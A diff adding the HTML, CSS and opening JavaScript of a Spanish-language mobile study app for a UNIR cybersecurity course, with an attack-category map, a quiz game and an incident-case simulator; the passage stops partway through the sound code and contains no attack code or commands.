@@ -1,0 +1,2145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <!-- Configuración Mobile-First optimizada para iPhone 11 (375x812 / 414x896) y pantallas OLED -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+    <meta name="theme-color" content="#030407">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>🛡️ CyberArch Black | Mapa y Juegos de Ciberataques (UNIR)</title>
+
+    <!-- =========================================================================
+         HOJA DE ESTILOS CSS: DISEÑO BLACK PURO (OLED), ACCESIBILIDAD NOCTURNA
+         PARA VER SIN GAFAS Y LAYOUT VISUAL MOBILE-FIRST (IPHONE 11)
+         ========================================================================= -->
+    <style>
+        /* Variables globales de color y tipografía dinámica */
+        :root {
+            /* Fondos negros puros para evitar deslumbramiento nocturno en iPhone */
+            --bg-oled: #030407;
+            --bg-surface: #0b0e17;
+            --bg-elevated: #121726;
+            --bg-glass: rgba(11, 14, 23, 0.94);
+
+            /* Bordes de alto contraste sutil */
+            --border-dim: #1e273d;
+            --border-bright: #334366;
+
+            /* Textos de altísimo contraste para lectura nocturna sin gafas */
+            --text-primary: #f8fafc;
+            --text-secondary: #cbd5e1;
+            --text-muted: #94a3b8;
+
+            /* Colores por Categoría de Arquitectura (Redes, SO, Servicios, Identidad/Malware) */
+            --cat-net: #38bdf8;         /* Azul Cian: Redes */
+            --cat-net-bg: rgba(56, 189, 248, 0.14);
+
+            --cat-os: #a855f7;          /* Violeta Neón: Sistemas Operativos */
+            --cat-os-bg: rgba(168, 85, 247, 0.14);
+
+            --cat-srv: #f59e0b;         /* Ámbar: Servicios (Web, BD, Correo) */
+            --cat-srv-bg: rgba(245, 158, 11, 0.14);
+
+            --cat-soc: #ec4899;         /* Rosa/Magenta: Phishing / Whaling / Malware */
+            --cat-soc-bg: rgba(236, 72, 153, 0.14);
+
+            /* Estados del juego */
+            --accent-green: #22c55e;
+            --accent-green-bg: rgba(34, 197, 94, 0.16);
+            --accent-red: #ff3b5c;
+            --accent-red-bg: rgba(255, 59, 92, 0.18);
+            --accent-gold: #fbbf24;
+
+            /* Tamaño de fuente raíz modificable por el usuario (por defecto 17px para móvil) */
+            --root-font-size: 17px;
+        }
+
+        /* Reset general y optimización táctil para iOS Safari */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            font-size: var(--root-font-size);
+            scroll-behavior: smooth;
+            -webkit-text-size-adjust: 100%;
+        }
+
+        body {
+            background-color: var(--bg-oled);
+            background-image:
+                radial-gradient(circle at 15% 10%, rgba(56, 189, 248, 0.06) 0%, transparent 40%),
+                radial-gradient(circle at 85% 85%, rgba(168, 85, 247, 0.06) 0%, transparent 40%);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.45;
+            min-height: 100vh;
+            padding-bottom: calc(5.2rem + env(safe-area-inset-bottom, 0px));
+            overflow-x: hidden;
+        }
+
+        /* =========================================================================
+           BARRA SUPERIOR FIJA: TÍTULO Y CONTROL DE TAMAÑO DE FUENTE (MODO NOCHE SIN GAFAS)
+           ========================================================================= */
+        .top-bar {
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            background: var(--bg-glass);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border-bottom: 1px solid var(--border-dim);
+            padding: calc(0.5rem + env(safe-area-inset-top, 0px)) 0.85rem 0.55rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0.5rem;
+        }
+
+        .app-brand {
+            display: flex;
+            align-items: center;
+            gap: 0.45rem;
+            font-weight: 800;
+            font-size: 1rem;
+            letter-spacing: -0.02em;
+            color: var(--text-primary);
+        }
+
+        .app-brand span.badge-unir {
+            background: var(--cat-net-bg);
+            color: var(--cat-net);
+            border: 1px solid rgba(56, 189, 248, 0.35);
+            font-size: 0.7rem;
+            padding: 0.1rem 0.4rem;
+            border-radius: 6px;
+            font-weight: 700;
+        }
+
+        /* Botonera de accesibilidad visual para aumentar/reducir letra rápidamente */
+        .font-controls {
+            display: flex;
+            align-items: center;
+            gap: 0.28rem;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            border-radius: 10px;
+            padding: 0.2rem;
+        }
+
+        .font-btn {
+            background: transparent;
+            color: var(--text-secondary);
+            border: none;
+            border-radius: 7px;
+            padding: 0.32rem 0.52rem;
+            font-weight: 800;
+            font-size: 0.82rem;
+            cursor: pointer;
+            transition: all 0.15s ease;
+            min-width: 2.1rem;
+            text-align: center;
+        }
+
+        .font-btn.active {
+            background: var(--cat-net);
+            color: #020617;
+            box-shadow: 0 0 10px rgba(56, 189, 248, 0.4);
+        }
+
+        .sound-btn {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            color: var(--text-primary);
+            border-radius: 10px;
+            padding: 0.35rem 0.55rem;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+
+        /* =========================================================================
+           CONTENEDOR PRINCIPAL Y NAVEGACIÓN INFERIOR TIPO APP IPHONE
+           ========================================================================= */
+        .main-container {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 0.85rem 0.85rem 1.5rem;
+        }
+
+        /* Barra de navegación inferior fija al pulgar (ideal para iPhone 11) */
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 250;
+            background: rgba(6, 8, 15, 0.96);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-top: 1px solid var(--border-bright);
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            padding: 0.4rem 0.5rem calc(0.45rem + env(safe-area-inset-bottom, 0px));
+            gap: 0.4rem;
+        }
+
+        .nav-tab {
+            background: transparent;
+            border: 1px solid transparent;
+            border-radius: 12px;
+            color: var(--text-muted);
+            padding: 0.45rem 0.25rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0.18rem;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.18s ease;
+        }
+
+        .nav-tab .tab-icon {
+            font-size: 1.25rem;
+            line-height: 1;
+        }
+
+        .nav-tab .tab-label {
+            font-size: 0.74rem;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+        }
+
+        .nav-tab.active {
+            background: var(--bg-elevated);
+            border-color: var(--cat-net);
+            color: var(--text-primary);
+            box-shadow: 0 0 14px rgba(56, 189, 248, 0.18);
+        }
+
+        /* Visibilidad de las 3 secciones principales */
+        .view-section {
+            display: none;
+            animation: fadeIn 0.22s ease-out;
+        }
+
+        .view-section.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* =========================================================================
+           PARTE 1: MAPA VISUAL DE ARQUITECTURA Y TARJETAS ILUSTRADAS (POCO TEXTO)
+           ========================================================================= */
+        .hero-card {
+            background: linear-gradient(145deg, #0d1322 0%, #070a12 100%);
+            border: 1px solid var(--border-bright);
+            border-radius: 16px;
+            padding: 0.95rem;
+            margin-bottom: 0.9rem;
+        }
+
+        .hero-title {
+            font-size: 1.15rem;
+            font-weight: 900;
+            margin-bottom: 0.25rem;
+            display: flex;
+            align-items: center;
+            gap: 0.45rem;
+        }
+
+        .hero-sub {
+            font-size: 0.86rem;
+            color: var(--text-secondary);
+        }
+
+        /* Esquema Visual Interactivo de las Capas de Arquitectura (Redes, SO, Servicios, Identidad) */
+        .arch-diagram {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 0.55rem;
+            margin: 0.8rem 0;
+        }
+
+        .arch-node {
+            background: var(--bg-surface);
+            border: 2px solid var(--border-dim);
+            border-radius: 14px;
+            padding: 0.65rem;
+            cursor: pointer;
+            transition: all 0.18s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .arch-node.active-filter {
+            border-color: var(--text-primary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
+        }
+
+        .arch-node[data-cat="REDES"] { border-left: 5px solid var(--cat-net); }
+        .arch-node[data-cat="SO"] { border-left: 5px solid var(--cat-os); }
+        .arch-node[data-cat="SERVICIOS"] { border-left: 5px solid var(--cat-srv); }
+        .arch-node[data-cat="SOCIAL"] { border-left: 5px solid var(--cat-soc); }
+
+        .arch-node-top {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-weight: 800;
+            font-size: 0.9rem;
+        }
+
+        .arch-node-count {
+            font-size: 0.72rem;
+            padding: 0.1rem 0.42rem;
+            border-radius: 99px;
+            background: var(--bg-elevated);
+            color: var(--text-secondary);
+        }
+
+        .arch-node-desc {
+            font-size: 0.76rem;
+            color: var(--text-muted);
+            line-height: 1.25;
+        }
+
+        /* Filtros rápidos por píldoras */
+        .filter-bar {
+            display: flex;
+            gap: 0.4rem;
+            overflow-x: auto;
+            padding-bottom: 0.45rem;
+            margin-bottom: 0.75rem;
+            scrollbar-width: none;
+        }
+        .filter-bar::-webkit-scrollbar { display: none; }
+
+        .filter-pill {
+            flex-shrink: 0;
+            background: var(--bg-surface);
+            color: var(--text-secondary);
+            border: 1px solid var(--border-dim);
+            border-radius: 99px;
+            padding: 0.42rem 0.8rem;
+            font-size: 0.8rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .filter-pill.active {
+            background: var(--text-primary);
+            color: var(--bg-oled);
+            border-color: var(--text-primary);
+        }
+
+        /* Cuadrícula de recuadros visuales de ciberataques */
+        .attack-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 0.85rem;
+        }
+
+        @media (min-width: 560px) {
+            .attack-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .attack-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            border-radius: 16px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            transition: transform 0.15s ease;
+        }
+
+        /* Cabecera visual con ilustración SVG integrada para recordar el ataque de un vistazo */
+        .attack-visual-box {
+            background: #060911;
+            border-bottom: 1px solid var(--border-dim);
+            padding: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            min-height: 125px;
+        }
+
+        .attack-visual-box svg {
+            width: 100%;
+            max-width: 260px;
+            height: 105px;
+            display: block;
+        }
+
+        .badge-unir-pick {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: rgba(251, 191, 36, 0.18);
+            color: var(--accent-gold);
+            border: 1px solid rgba(251, 191, 36, 0.5);
+            font-size: 0.68rem;
+            font-weight: 800;
+            padding: 0.15rem 0.45rem;
+            border-radius: 6px;
+        }
+
+        .badge-cat-tag {
+            position: absolute;
+            top: 0.5rem;
+            left: 0.5rem;
+            font-size: 0.68rem;
+            font-weight: 800;
+            padding: 0.15rem 0.5rem;
+            border-radius: 6px;
+            text-transform: uppercase;
+        }
+
+        .cat-REDES { background: var(--cat-net-bg); color: var(--cat-net); border: 1px solid var(--cat-net); }
+        .cat-SO { background: var(--cat-os-bg); color: var(--cat-os); border: 1px solid var(--cat-os); }
+        .cat-SERVICIOS { background: var(--cat-srv-bg); color: var(--cat-srv); border: 1px solid var(--cat-srv); }
+        .cat-SOCIAL { background: var(--cat-soc-bg); color: var(--cat-soc); border: 1px solid var(--cat-soc); }
+
+        .attack-body {
+            padding: 0.85rem;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            flex: 1;
+        }
+
+        .attack-title {
+            font-size: 1.05rem;
+            font-weight: 900;
+            color: var(--text-primary);
+            line-height: 1.25;
+        }
+
+        /* Descripción corta y directa (sin párrafos interminables) */
+        .attack-short-desc {
+            font-size: 0.88rem;
+            color: var(--text-secondary);
+            line-height: 1.38;
+        }
+
+        /* Bloques clave ultra-visuales (Cómo entra / Qué rompe / Escudo) */
+        .mini-facts {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0.4rem;
+            margin-top: 0.15rem;
+        }
+
+        .fact-chip {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-dim);
+            border-radius: 10px;
+            padding: 0.4rem 0.55rem;
+            font-size: 0.76rem;
+        }
+
+        .fact-chip strong {
+            display: block;
+            color: var(--text-muted);
+            font-size: 0.66rem;
+            text-transform: uppercase;
+            margin-bottom: 0.1rem;
+        }
+
+        .shield-strip {
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.35);
+            border-radius: 10px;
+            padding: 0.45rem 0.6rem;
+            font-size: 0.8rem;
+            color: #bbf7d0;
+            margin-top: auto;
+        }
+
+        .shield-strip strong {
+            color: var(--accent-green);
+        }
+
+        /* =========================================================================
+           ESTILOS COMUNES PARA LOS DOS JUEGOS (HUD DE 3 VIDAS, PUNTUACIÓN Y PROGRESO)
+           ========================================================================= */
+        .game-hud {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            border-radius: 16px;
+            padding: 0.7rem 0.85rem;
+            margin-bottom: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .lives-box {
+            display: flex;
+            align-items: center;
+            gap: 0.25rem;
+            font-size: 1.25rem;
+            letter-spacing: 0.08rem;
+        }
+
+        .hud-metrics {
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .metric-pill {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-dim);
+            padding: 0.3rem 0.65rem;
+            border-radius: 10px;
+            font-size: 0.82rem;
+            font-weight: 800;
+        }
+
+        .metric-pill span.gold {
+            color: var(--accent-gold);
+        }
+
+        /* Tarjeta de pregunta o caso activo */
+        .arena-card {
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            border-radius: 18px;
+            padding: 1rem;
+            margin-bottom: 0.9rem;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.55);
+        }
+
+        .arena-badge-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0.4rem;
+            margin-bottom: 0.65rem;
+            flex-wrap: wrap;
+        }
+
+        .step-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            font-size: 0.76rem;
+            font-weight: 800;
+            padding: 0.25rem 0.65rem;
+            border-radius: 8px;
+            text-transform: uppercase;
+        }
+
+        .step-phase-1 {
+            background: var(--accent-red-bg);
+            color: var(--accent-red);
+            border: 1px solid var(--accent-red);
+        }
+
+        .step-phase-2 {
+            background: var(--cat-net-bg);
+            color: var(--cat-net);
+            border: 1px solid var(--cat-net);
+        }
+
+        .question-title {
+            font-size: 1.08rem;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 0.85rem;
+            line-height: 1.4;
+        }
+
+        /* Caja de telemetría / escenario de caso práctico */
+        .case-terminal {
+            background: #05070c;
+            border-left: 4px solid var(--accent-red);
+            border-top: 1px solid var(--border-dim);
+            border-right: 1px solid var(--border-dim);
+            border-bottom: 1px solid var(--border-dim);
+            border-radius: 12px;
+            padding: 0.85rem;
+            margin-bottom: 0.85rem;
+            font-size: 0.92rem;
+            color: var(--text-primary);
+            line-height: 1.45;
+        }
+
+        .case-log-line {
+            margin-top: 0.55rem;
+            padding-top: 0.5rem;
+            border-top: 1px dashed var(--border-dim);
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+            font-size: 0.8rem;
+            color: var(--cat-net);
+            word-break: break-word;
+        }
+
+        /* Opciones de respuesta táctiles para el pulgar */
+        .options-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.6rem;
+        }
+
+        .option-btn {
+            width: 100%;
+            text-align: left;
+            background: var(--bg-elevated);
+            color: var(--text-primary);
+            border: 2px solid var(--border-bright);
+            border-radius: 14px;
+            padding: 0.8rem 0.9rem;
+            font-size: 0.92rem;
+            font-weight: 600;
+            line-height: 1.38;
+            cursor: pointer;
+            display: flex;
+            align-items: flex-start;
+            gap: 0.65rem;
+            transition: all 0.15s ease;
+            font-family: inherit;
+        }
+
+        .option-btn:active:not(:disabled) {
+            transform: scale(0.99);
+        }
+
+        .option-letter {
+            flex-shrink: 0;
+            width: 1.75rem;
+            height: 1.75rem;
+            border-radius: 8px;
+            background: var(--bg-surface);
+            border: 1px solid var(--border-bright);
+            color: var(--cat-net);
+            font-weight: 900;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .option-btn.correct {
+            background: var(--accent-green-bg);
+            border-color: var(--accent-green);
+            color: #ffffff;
+        }
+
+        .option-btn.correct .option-letter {
+            background: var(--accent-green);
+            color: #020617;
+            border-color: var(--accent-green);
+        }
+
+        .option-btn.wrong {
+            background: var(--accent-red-bg);
+            border-color: var(--accent-red);
+            color: #fecdd3;
+        }
+
+        .option-btn.wrong .option-letter {
+            background: var(--accent-red);
+            color: #ffffff;
+            border-color: var(--accent-red);
+        }
+
+        /* Caja de retroalimentación tras responder */
+        .feedback-box {
+            margin-top: 0.85rem;
+            padding: 0.85rem;
+            border-radius: 14px;
+            background: #070b14;
+            border: 1px solid var(--border-bright);
+            display: none;
+        }
+
+        .feedback-box.show {
+            display: block;
+            animation: fadeIn 0.2s ease-out;
+        }
+
+        .feedback-title {
+            font-weight: 900;
+            font-size: 0.95rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .feedback-text {
+            font-size: 0.86rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.75rem;
+            line-height: 1.4;
+        }
+
+        .primary-action-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            padding: 0.85rem 1rem;
+            font-size: 0.95rem;
+            font-weight: 900;
+            cursor: pointer;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.4);
+        }
+
+        /* Pantalla de Game Over / Victoria cuando se pierden las 3 vidas o se completa todo */
+        .endgame-panel {
+            background: var(--bg-surface);
+            border: 2px solid var(--border-bright);
+            border-radius: 18px;
+            padding: 1.35rem 1rem;
+            text-align: center;
+            display: none;
+        }
+
+        .endgame-panel.show {
+            display: block;
+            animation: fadeIn 0.25s ease-out;
+        }
+
+        .endgame-icon {
+            font-size: 3rem;
+            margin-bottom: 0.4rem;
+        }
+
+        .endgame-title {
+            font-size: 1.35rem;
+            font-weight: 900;
+            margin-bottom: 0.4rem;
+        }
+
+        .endgame-desc {
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-bottom: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- =========================================================================
+         CABECERA PERSISTENTE: TÍTULO Y CAMBIADOR DE FUENTE (MODO NOCTURNO SIN GAFAS)
+         ========================================================================= -->
+    <header class="top-bar">
+        <div class="app-brand">
+            <span>🛡️ CyberArch</span>
+            <span class="badge-unir">UNIR</span>
+        </div>
+
+        <!-- Botones de tamaño de letra (A- a A+++) para ver de noche sin gafas en iPhone 11 -->
+        <div style="display: flex; align-items: center; gap: 0.4rem;">
+            <div class="font-controls" role="group" aria-label="Tamaño de letra">
+                <button class="font-btn" onclick="setFontSize(15, this)" title="Letra compacta">A-</button>
+                <button class="font-btn active" onclick="setFontSize(17, this)" title="Letra normal">A</button>
+                <button class="font-btn" onclick="setFontSize(20, this)" title="Letra grande (sin gafas)">A+</button>
+                <button class="font-btn" onclick="setFontSize(23, this)" title="Letra extra grande nocturna">A++</button>
+            </div>
+            <button id="soundToggleBtn" class="sound-btn" onclick="toggleSound()" title="Activar/Desactivar sonido">🔊</button>
+        </div>
+    </header>
+
+    <main class="main-container">
+
+        <!-- =========================================================================
+             PARTE 1: MAPA VISUAL DE CIBERATAQUES POR CATEGORÍAS DE ARQUITECTURA
+             ========================================================================= -->
+        <section id="view-map" class="view-section active">
+            <div class="hero-card">
+                <div class="hero-title">🗺️ Mapa Visual de Ciberataques</div>
+                <p class="hero-sub">
+                    Toca una capa de la arquitectura para filtrar los ataques. Esquemas visuales directos sin bloques de texto largos.
+                </p>
+
+                <!-- Mapa interactivo de 4 bloques de arquitectura -->
+                <div class="arch-diagram">
+                    <div class="arch-node" data-cat="REDES" onclick="filterMap('REDES')">
+                        <div class="arch-node-top">
+                            <span style="color: var(--cat-net);">🌐 1. Redes</span>
+                            <span class="arch-node-count">4 ataques</span>
+                        </div>
+                        <div class="arch-node-desc">Tráfico, tablas ARP, rutas DNS y saturación DDoS.</div>
+                    </div>
+
+                    <div class="arch-node" data-cat="SO" onclick="filterMap('SO')">
+                        <div class="arch-node-top">
+                            <span style="color: var(--cat-os);">💻 2. Sist. Operativos</span>
+                            <span class="arch-node-count">4 ataques</span>
+                        </div>
+                        <div class="arch-node-desc">Memoria RAM, Kernel, privilegios y Rootkits.</div>
+                    </div>
+
+                    <div class="arch-node" data-cat="SERVICIOS" onclick="filterMap('SERVICIOS')">
+                        <div class="arch-node-top">
+                            <span style="color: var(--cat-srv);">🗄️ 3. Servicios</span>
+                            <span class="arch-node-count">4 ataques</span>
+                        </div>
+                        <div class="arch-node-desc">Bases de datos SQL, Web, Active Directory y APIs.</div>
+                    </div>
+
+                    <div class="arch-node" data-cat="SOCIAL" onclick="filterMap('SOCIAL')">
+                        <div class="arch-node-top">
+                            <span style="color: var(--cat-soc);">🎣 4. Correo y Malware</span>
+                            <span class="arch-node-count">4 ataques</span>
+                        </div>
+                        <div class="arch-node-desc">Phishing, Spear Phishing, Whaling y Ransomware.</div>
+                    </div>
+                </div>
+
+                <!-- Píldoras de filtrado rápido (incluye filtro especial con los 6 ataques recomendados 2+2+2 para la tarea UNIR) -->
+                <div class="filter-bar">
+                    <button class="filter-pill active" id="pill-ALL" onclick="filterMap('ALL')">👁️ Todos (16)</button>
+                    <button class="filter-pill" id="pill-UNIR6" onclick="filterMap('UNIR6')">⭐ Selección Tarea UNIR (2+2+2)</button>
+                    <button class="filter-pill" id="pill-REDES" onclick="filterMap('REDES')">🌐 Redes</button>
+                    <button class="filter-pill" id="pill-SO" onclick="filterMap('SO')">💻 Sist. Operativos</button>
+                    <button class="filter-pill" id="pill-SERVICIOS" onclick="filterMap('SERVICIOS')">🗄️ Servicios</button>
+                    <button class="filter-pill" id="pill-SOCIAL" onclick="filterMap('SOCIAL')">🎣 Phishing / Malware</button>
+                </div>
+            </div>
+
+            <!-- Contenedor donde se pintan los recuadros visuales con ilustraciones SVG -->
+            <div id="attackGridContainer" class="attack-grid"></div>
+        </section>
+
+        <!-- =========================================================================
+             PARTE 2: JUEGO TEST DE PREGUNTAS Y RESPUESTAS (ORDEN ALEATORIO, 3 VIDAS)
+             ========================================================================= -->
+        <section id="view-quiz" class="view-section">
+            <!-- Marcador superior del Juego 1 -->
+            <div class="game-hud">
+                <div class="lives-box" id="quizLivesDisplay" aria-label="Vidas restantes">❤️❤️❤️</div>
+                <div class="hud-metrics">
+                    <div class="metric-pill">Pts: <span class="gold" id="quizScoreDisplay">0</span></div>
+                    <div class="metric-pill" id="quizProgressDisplay">1 / 18</div>
+                </div>
+            </div>
+
+            <!-- Tarjeta activa de pregunta -->
+            <div id="quizPlayArea" class="arena-card">
+                <div class="arena-badge-row">
+                    <span class="step-indicator step-phase-2" id="quizCatBadge">CATEGORÍA</span>
+                    <span style="font-size: 0.78rem; color: var(--text-muted);" id="quizStreakBadge">🔥 Racha: 0</span>
+                </div>
+
+                <div class="question-title" id="quizQuestionText">Cargando pregunta...</div>
+
+                <div class="options-list" id="quizOptionsList"></div>
+
+                <div class="feedback-box" id="quizFeedbackBox">
+                    <div class="feedback-title" id="quizFeedbackTitle"></div>
+                    <div class="feedback-text" id="quizFeedbackText"></div>
+                    <button class="primary-action-btn" onclick="nextQuizQuestion()">Siguiente Pregunta ➔</button>
+                </div>
+            </div>
+
+            <!-- Pantalla de fin de partida del Quiz (si pierdes las 3 vidas o completas todo) -->
+            <div id="quizEndPanel" class="endgame-panel">
+                <div class="endgame-icon" id="quizEndIcon">💀</div>
+                <div class="endgame-title" id="quizEndTitle">¡Has perdido las 3 vidas!</div>
+                <p class="endgame-desc" id="quizEndDesc"></p>
+                <button class="primary-action-btn" onclick="initQuizGame()">🔄 Volver a Empezar (Preguntas Mezcladas)</button>
+            </div>
+        </section>
+
+        <!-- =========================================================================
+             PARTE 3: SIMULADOR DE CASOS COMPLICADOS (1º IDENTIFICAR ATAQUE + 2º SOLUCIÓN)
+             ========================================================================= -->
+        <section id="view-cases" class="view-section">
+            <!-- Marcador superior del Juego 2 -->
+            <div class="game-hud">
+                <div class="lives-box" id="caseLivesDisplay" aria-label="Vidas restantes">❤️❤️❤️</div>
+                <div class="hud-metrics">
+                    <div class="metric-pill">Pts: <span class="gold" id="caseScoreDisplay">0</span></div>
+                    <div class="metric-pill" id="caseProgressDisplay">Caso 1 / 14</div>
+                </div>
+            </div>
+
+            <!-- Tarjeta activa del Caso Práctico en 2 fases -->
+            <div id="casePlayArea" class="arena-card">
+                <div class="arena-badge-row">
+                    <span class="step-indicator step-phase-1" id="casePhaseBadge">FASE 1 DE 2: IDENTIFICAR EL ATAQUE</span>
+                    <span style="font-size: 0.76rem; color: var(--text-muted);" id="caseLayerBadge">Capa</span>
+                </div>
+
+                <!-- Escenario del incidente y telemetría técnica -->
+                <div class="case-terminal">
+                    <div id="caseScenarioText"></div>
+                    <div class="case-log-line" id="caseLogText"></div>
+                </div>
+
+                <div class="question-title" id="casePromptText">
+                    1️⃣ ¿Qué ciberataque exacto está sufriendo esta arquitectura?
+                </div>
+
+                <!-- Opciones mezcladas con otros casos reales para máxima dificultad -->
+                <div class="options-list" id="caseOptionsList"></div>
+
+                <!-- Retroalimentación de cada fase -->
+                <div class="feedback-box" id="caseFeedbackBox">
+                    <div class="feedback-title" id="caseFeedbackTitle"></div>
+                    <div class="feedback-text" id="caseFeedbackText"></div>
+                    <button class="primary-action-btn" id="caseNextBtn" onclick="advanceCaseStep()">Continuar ➔</button>
+                </div>
+            </div>
+
+            <!-- Pantalla de fin de partida del Simulador de Casos -->
+            <div id="caseEndPanel" class="endgame-panel">
+                <div class="endgame-icon" id="caseEndIcon">💀</div>
+                <div class="endgame-title" id="caseEndTitle">¡Sistema Comprometido!</div>
+                <p class="endgame-desc" id="caseEndDesc"></p>
+                <button class="primary-action-btn" onclick="initCasesGame()">🔄 Volver a Empezar (Casos Mezclados)</button>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- =========================================================================
+         NAVEGACIÓN INFERIOR EN 3 PARTES (ACCESIBLE CON EL PULGAR EN IPHONE 11)
+         ========================================================================= -->
+    <nav class="bottom-nav" aria-label="Navegación principal">
+        <button class="nav-tab active" id="tab-map" onclick="switchView('map')">
+            <span class="tab-icon">🗺️</span>
+            <span class="tab-label">1. Mapa Visual</span>
+        </button>
+        <button class="nav-tab" id="tab-quiz" onclick="switchView('quiz')">
+            <span class="tab-icon">❓</span>
+            <span class="tab-label">2. Test Quiz</span>
+        </button>
+        <button class="nav-tab" id="tab-cases" onclick="switchView('cases')">
+            <span class="tab-icon">🕵️</span>
+            <span class="tab-label">3. Casos + Solución</span>
+        </button>
+    </nav>
+
+    <!-- =========================================================================
+         LÓGICA JAVASCRIPT CON COMENTARIOS DETALLADOS DE CADA PARTE DEL PROGRAMA
+         ========================================================================= -->
+    <script>
+        /* =====================================================================
+           1. SISTEMA DE ACCESIBILIDAD VISUAL (TAMAÑO DE FUENTE) Y SONIDO WEB AUDIO
+           ===================================================================== */
+        let soundEnabled = true;
+        let audioCtx = null;
+
+        /**
+         * Cambia el tamaño de la fuente base de toda la aplicación en tiempo real
+         * y guarda la preferencia en localStorage para estudiar de noche sin gafas.
+         */
+        function setFontSize(sizePx, btnElement) {
+            document.documentElement.style.setProperty('--root-font-size', sizePx + 'px');
+            localStorage.setItem('cyberarch_font_size', sizePx);
+
+            // Actualizar estado activo de los botones A-, A, A+, A++
+            document.querySelectorAll('.font-btn').forEach(btn => btn.classList.remove('active'));
+            if (btnElement) {
+                btnElement.classList.add('active');
+            }
+        }
+
+        /**
+         * Restaura el tamaño de fuente guardado por el usuario al abrir la web en el iPhone.
+         */
+        function loadSavedFontSize() {
+            const saved = localStorage.getItem('cyberarch_font_size');
+            if (saved) {
+                document.documentElement.style.setProperty('--root-font-size', saved + 'px');
+                const mapSizeToIdx = { '15': 0, '17': 1, '20': 2, '23': 3 };
+                const btns = document.querySelectorAll('.font-btn');
+                btns.forEach(b => b.classList.remove('active'));
+                if (mapSizeToIdx[saved] !== undefined && btns[mapSizeToIdx[saved]]) {
+                    btns[mapSizeToIdx[saved]].classList.add('active');
+                }
+            }
+        }
+
+        /**
+         * Activa o desactiva los efectos de sonido sintetizados.
+         */
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            document.getElementById('soundToggleBtn').textContent = soundEnabled ? '🔊' : '🔇';
+        }
+
+        /**
+         * Genera tonos cortos de acierto, fallo o Game Over usando Web Audio API
+         * sin depender de archivos MP3 externos.
+         */
+        function playTone(type) {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+
+                const now = audioCtx.currentTime;
+                if (type === 'hit') {
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(520, now);
